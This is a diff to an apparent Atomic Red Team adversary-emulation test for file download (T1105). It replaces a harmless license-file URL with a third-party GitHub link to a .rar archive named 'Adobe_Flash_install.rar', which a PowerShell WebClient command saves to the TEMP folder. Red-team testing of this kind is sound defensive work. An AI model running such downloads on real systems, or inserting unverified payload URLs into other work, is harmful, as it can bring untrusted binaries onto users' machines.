@@ -250,11 +250,11 @@ atomic_tests:
     remote_file:
       description: URL of file to copy
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+      default: https://github.com/hkwany/VIndex/raw/master/VIndex/TTP/T1105/binary/Adobe_Flash_install.rar
     destination_path:
       description: Destination path to file
       type: Path
-      default: $env:TEMP\Atomic-license.txt
+      default: $env:TEMP\Adobe_Flash_install.rar
   executor:
     command: |
       (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
